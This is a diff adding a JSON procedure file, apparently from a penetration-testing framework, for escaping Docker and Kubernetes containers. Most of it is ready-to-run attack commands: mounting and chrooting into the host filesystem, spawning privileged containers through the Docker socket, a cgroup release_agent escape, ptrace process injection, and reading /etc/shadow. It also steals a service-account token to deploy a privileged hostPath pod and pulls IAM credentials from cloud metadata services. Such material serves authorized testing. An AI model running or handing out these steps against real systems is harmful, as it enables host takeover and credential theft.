@@ -1,0 +1,415 @@
+{
+  "id": "container_breakout",
+  "name": "Container Breakout Techniques",
+  "description": "Escape from Docker, Kubernetes, and other containerized environments",
+  "category": "Breakout",
+  "subcategory": "Container Escape",
+  "version": "1.0",
+  "author": "Breakout Testing Framework",
+  "tags": ["docker", "kubernetes", "container", "escape", "breakout"],
+  "triggers": [
+    {
+      "id": "container_environment_detected",
+      "name": "Container Environment Detected",
+      "description": "Trigger when container runtime is identified",
+      "conditions": {
+        "asset_type": "host",
+        "properties": {
+          "container_runtime": "docker"
+        }
+      }
+    },
+    {
+      "id": "restricted_container_environment",
+      "name": "Restricted Container Environment",
+      "description": "Trigger when in restricted container environment",
+      "conditions": {
+        "asset_type": "restrictedEnvironment",
+        "properties": {
+          "environment_type": "container"
+        }
+      }
+    }
+  ],
+  "procedures": [
+    {
+      "id": "container_identification",
+      "name": "Container Environment Identification",
+      "description": "Identify the type and configuration of container environment",
+      "order": 1,
+      "riskLevel": "low",
+      "steps": [
+        {
+          "id": "check_container_indicators",
+          "name": "Check Container Indicators",
+          "description": "Look for container-specific files and processes",
+          "command": "ls -la /.dockerenv; cat /proc/1/cgroup | grep -i docker; mount | grep docker",
+          "expectedOutput": "Container environment indicators",
+          "timeout": 30
+        },
+        {
+          "id": "check_kubernetes_indicators",
+          "name": "Check Kubernetes Indicators",
+          "description": "Look for Kubernetes service account and secrets",
+          "command": "ls -la /var/run/secrets/kubernetes.io/; env | grep KUBERNETES; mount | grep kubernetes",
+          "expectedOutput": "Kubernetes environment indicators",
+          "timeout": 30
+        },
+        {
+          "id": "check_capabilities",
+          "name": "Check Container Capabilities",
+          "description": "Examine assigned Linux capabilities",
+          "command": "capsh --print; cat /proc/self/status | grep Cap",
+          "expectedOutput": "Linux capabilities assigned to container",
+          "timeout": 15
+        },
+        {
+          "id": "check_seccomp_status",
+          "name": "Check Seccomp Status",
+          "description": "Verify seccomp filter status",
+          "command": "cat /proc/self/status | grep -i seccomp; grep Seccomp /proc/self/status",
+          "expectedOutput": "Seccomp filtering configuration",
+          "timeout": 15
+        }
+      ]
+    },
+    {
+      "id": "privileged_container_exploitation",
+      "name": "Privileged Container Exploitation",
+      "description": "Exploit privileged container configurations for host access",
+      "order": 2,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "check_privileged_status",
+          "name": "Check Privileged Status",
+          "description": "Determine if container is running in privileged mode",
+          "command": "capsh --print | grep cap_sys_admin; ls -la /dev/ | wc -l",
+          "expectedOutput": "Privileged capabilities and device access",
+          "timeout": 30
+        },
+        {
+          "id": "mount_host_filesystem",
+          "name": "Mount Host Filesystem",
+          "description": "Mount host filesystem from privileged container",
+          "command": "mkdir /host 2>/dev/null; mount /dev/sda1 /host 2>/dev/null || mount /dev/xvda1 /host 2>/dev/null || mount /dev/nvme0n1p1 /host 2>/dev/null",
+          "expectedOutput": "Host filesystem mounted successfully",
+          "timeout": 30
+        },
+        {
+          "id": "chroot_to_host",
+          "name": "Chroot to Host",
+          "description": "Chroot into host filesystem for full host access",
+          "command": "chroot /host /bin/bash -c 'echo Container breakout successful; id; hostname'",
+          "expectedOutput": "Host system access achieved",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "docker_socket_exploitation",
+      "name": "Docker Socket Exploitation",
+      "description": "Exploit exposed Docker socket for container escape",
+      "order": 3,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "check_docker_socket",
+          "name": "Check Docker Socket Access",
+          "description": "Look for exposed Docker socket",
+          "command": "ls -la /var/run/docker.sock; ls -la /var/run/docker.sock 2>/dev/null && echo 'Docker socket accessible'",
+          "expectedOutput": "Docker socket accessibility status",
+          "timeout": 15
+        },
+        {
+          "id": "list_containers",
+          "name": "List Docker Containers",
+          "description": "Use Docker socket to list containers",
+          "command": "docker -H unix:///var/run/docker.sock ps -a",
+          "expectedOutput": "List of Docker containers on host",
+          "timeout": 30
+        },
+        {
+          "id": "create_privileged_container",
+          "name": "Create Privileged Container",
+          "description": "Create new privileged container with host filesystem access",
+          "command": "docker -H unix:///var/run/docker.sock run -it -v /:/host --privileged alpine chroot /host bash",
+          "expectedOutput": "New privileged container with host access",
+          "timeout": 60
+        },
+        {
+          "id": "escalate_via_existing_container",
+          "name": "Escalate via Existing Container",
+          "description": "Execute commands in existing containers",
+          "command": "docker -H unix:///var/run/docker.sock exec -it $(docker ps -q | head -1) /bin/sh",
+          "expectedOutput": "Shell access in another container",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "capability_abuse",
+      "name": "Linux Capability Abuse",
+      "description": "Exploit dangerous Linux capabilities for container escape",
+      "order": 4,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "cap_sys_admin_exploit",
+          "name": "CAP_SYS_ADMIN Exploitation",
+          "description": "Exploit CAP_SYS_ADMIN for cgroup notification escape",
+          "command": "mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup && echo 1 > /tmp/cgroup/notify_on_release && echo \"$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)/cmd\" > /tmp/cgroup/release_agent",
+          "expectedOutput": "Cgroup escape mechanism prepared",
+          "timeout": 45
+        },
+        {
+          "id": "cap_sys_ptrace_exploit",
+          "name": "CAP_SYS_PTRACE Exploitation",
+          "description": "Use process tracing to escape container",
+          "command": "ps aux | grep -v grep | grep -E '(systemd|init)' | head -1 | awk '{print $2}' | xargs -I {} gdb -p {} -batch -ex 'call system(\"echo ptrace escape test\")'",
+          "expectedOutput": "Process injection via ptrace capability",
+          "timeout": 60
+        },
+        {
+          "id": "cap_dac_override_exploit",
+          "name": "CAP_DAC_OVERRIDE Exploitation",
+          "description": "Bypass file access controls with DAC override",
+          "command": "cat /etc/shadow 2>/dev/null && echo 'DAC override successful' || echo 'DAC override failed'",
+          "expectedOutput": "File access bypass confirmation",
+          "timeout": 15
+        }
+      ]
+    },
+    {
+      "id": "kubernetes_exploitation",
+      "name": "Kubernetes Environment Exploitation",
+      "description": "Exploit Kubernetes service account tokens and API access",
+      "order": 5,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "extract_service_token",
+          "name": "Extract Service Account Token",
+          "description": "Extract Kubernetes service account token",
+          "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token; export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)",
+          "expectedOutput": "Service account token extracted",
+          "timeout": 15
+        },
+        {
+          "id": "query_kubernetes_api",
+          "name": "Query Kubernetes API",
+          "description": "Use service account token to query Kubernetes API",
+          "command": "curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/default/pods",
+          "expectedOutput": "Kubernetes API response with pod information",
+          "timeout": 30
+        },
+        {
+          "id": "create_privileged_pod",
+          "name": "Create Privileged Pod",
+          "description": "Attempt to create privileged pod with host access",
+          "command": "cat > /tmp/priv-pod.yaml << 'EOF'\napiVersion: v1\nkind: Pod\nmetadata:\n  name: priv-pod\nspec:\n  containers:\n  - name: shell\n    image: alpine\n    command: [\"/bin/sh\"]\n    args: [\"-c\", \"sleep 3600\"]\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - name: host\n      mountPath: /host\n  volumes:\n  - name: host\n    hostPath:\n      path: /\nEOF",
+          "expectedOutput": "Privileged pod manifest created",
+          "timeout": 30
+        },
+        {
+          "id": "deploy_privileged_pod",
+          "name": "Deploy Privileged Pod",
+          "description": "Deploy the privileged pod to Kubernetes cluster",
+          "command": "kubectl apply -f /tmp/priv-pod.yaml 2>/dev/null || curl -k -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/yaml\" --data-binary @/tmp/priv-pod.yaml https://kubernetes.default.svc/api/v1/namespaces/default/pods",
+          "expectedOutput": "Privileged pod deployment status",
+          "timeout": 60
+        }
+      ]
+    },
+    {
+      "id": "kernel_exploitation",
+      "name": "Kernel Exploitation",
+      "description": "Use kernel vulnerabilities for container escape",
+      "order": 6,
+      "riskLevel": "critical",
+      "steps": [
+        {
+          "id": "check_kernel_version",
+          "name": "Check Kernel Version",
+          "description": "Identify kernel version for vulnerability assessment",
+          "command": "uname -r; cat /proc/version",
+          "expectedOutput": "Kernel version information",
+          "timeout": 15
+        },
+        {
+          "id": "dirty_cow_check",
+          "name": "DirtyCOW Vulnerability Check",
+          "description": "Check for DirtyCOW vulnerability (CVE-2016-5195)",
+          "command": "uname -r | grep -E '(2\\.6\\.|3\\.|4\\.[0-8]\\.)' && echo 'Potentially vulnerable to DirtyCOW' || echo 'Likely patched against DirtyCOW'",
+          "expectedOutput": "DirtyCOW vulnerability assessment",
+          "timeout": 15
+        },
+        {
+          "id": "dirty_pipe_check",
+          "name": "DirtyPipe Vulnerability Check",
+          "description": "Check for DirtyPipe vulnerability (CVE-2022-0847)",
+          "command": "uname -r | grep -E '(5\\.(8|9|10|11|12|13|14|15|16)\\.)' && echo 'Potentially vulnerable to DirtyPipe' || echo 'Likely patched against DirtyPipe'",
+          "expectedOutput": "DirtyPipe vulnerability assessment",
+          "timeout": 15
+        },
+        {
+          "id": "runc_exploitation",
+          "name": "runC Exploitation (CVE-2019-5736)",
+          "description": "Check for runC vulnerability allowing container escape",
+          "command": "runc --version 2>/dev/null | head -1; docker version 2>/dev/null | grep -E '(Version|API)' || echo 'runC version check failed'",
+          "expectedOutput": "runC version for vulnerability assessment",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "cloud_metadata_access",
+      "name": "Cloud Metadata Service Access",
+      "description": "Access cloud metadata services from container",
+      "order": 7,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "aws_metadata_access",
+          "name": "AWS Metadata Access",
+          "description": "Attempt to access AWS instance metadata",
+          "command": "curl -s http://169.254.169.254/latest/meta-data/ --connect-timeout 5; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --connect-timeout 5",
+          "expectedOutput": "AWS metadata service response",
+          "timeout": 30
+        },
+        {
+          "id": "gcp_metadata_access",
+          "name": "GCP Metadata Access",
+          "description": "Attempt to access Google Cloud metadata",
+          "command": "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ --connect-timeout 5",
+          "expectedOutput": "GCP metadata service response",
+          "timeout": 30
+        },
+        {
+          "id": "azure_metadata_access",
+          "name": "Azure Metadata Access",
+          "description": "Attempt to access Azure instance metadata",
+          "command": "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' --connect-timeout 5",
+          "expectedOutput": "Azure metadata service response",
+          "timeout": 30
+        }
+      ]
+    }
+  ],
+  "risks": [
+    {
+      "risk": "Container escape may compromise entire host system",
+      "mitigation": "Perform testing in isolated environment with network restrictions"
+    },
+    {
+      "risk": "Kernel exploits may cause system instability",
+      "mitigation": "Test kernel exploits only with explicit approval and system backups"
+    },
+    {
+      "risk": "Privileged operations may trigger security monitoring",
+      "mitigation": "Coordinate with security team before attempting privileged operations"
+    },
+    {
+      "risk": "Cloud metadata access may expose sensitive credentials",
+      "mitigation": "Handle any discovered credentials according to security protocols"
+    },
+    {
+      "risk": "Docker socket access may affect other containers",
+      "mitigation": "Document any container modifications for cleanup"
+    }
+  ],
+  "tools": [
+    {
+      "name": "Docker CLI",
+      "version": "Any",
+      "required": false,
+      "purpose": "Container management and Docker socket interaction"
+    },
+    {
+      "name": "kubectl",
+      "version": "Any",
+      "required": false,
+      "purpose": "Kubernetes cluster interaction"
+    },
+    {
+      "name": "Linux Capabilities Tools",
+      "version": "Any",
+      "required": true,
+      "purpose": "Capability enumeration and exploitation"
+    },
+    {
+      "name": "curl/wget",
+      "version": "Any",
+      "required": true,
+      "purpose": "HTTP requests for API and metadata access"
+    },
+    {
+      "name": "GDB",
+      "version": "Any",
+      "required": false,
+      "purpose": "Process debugging for ptrace exploitation"
+    }
+  ],
+  "equipment": [
+    {
+      "name": "Container Environment Access",
+      "required": true,
+      "description": "Shell access within Docker, Kubernetes, or other container"
+    },
+    {
+      "name": "Network Connectivity",
+      "required": false,
+      "description": "Network access for API calls and metadata services"
+    }
+  ],
+  "suggestedFindings": [
+    {
+      "title": "Container Environment Identified",
+      "description": "Successfully identified container runtime and configuration",
+      "severity": "informational",
+      "evidence": "Container indicators, capability listings, security context"
+    },
+    {
+      "title": "Privileged Container Detected",
+      "description": "Container running with dangerous privileged access",
+      "severity": "high",
+      "evidence": "Capability enumeration, device access, host filesystem mounting"
+    },
+    {
+      "title": "Docker Socket Exposed",
+      "description": "Docker socket accessible allowing container creation and management",
+      "severity": "critical",
+      "evidence": "Docker socket access, container listing, privileged container creation"
+    },
+    {
+      "title": "Dangerous Linux Capabilities",
+      "description": "Container has excessive Linux capabilities enabling escape",
+      "severity": "high",
+      "evidence": "Capability abuse demonstrations, file access bypass"
+    },
+    {
+      "title": "Kubernetes Service Account Compromise",
+      "description": "Service account token accessible with cluster permissions",
+      "severity": "high",
+      "evidence": "Token extraction, API queries, privileged pod creation"
+    },
+    {
+      "title": "Kernel Vulnerability Exposure",
+      "description": "Vulnerable kernel version susceptible to container escape exploits",
+      "severity": "critical",
+      "evidence": "Kernel version, vulnerability assessment, exploit feasibility"
+    },
+    {
+      "title": "Cloud Metadata Service Access",
+      "description": "Cloud instance metadata accessible from container",
+      "severity": "medium",
+      "evidence": "Metadata service responses, available endpoints, credential exposure"
+    },
+    {
+      "title": "Container Breakout Successful",
+      "description": "Successfully escaped container restrictions and gained host access",
+      "severity": "critical",
+      "evidence": "Host filesystem access, privileged command execution, system compromise"
+    }
+  ]
+}
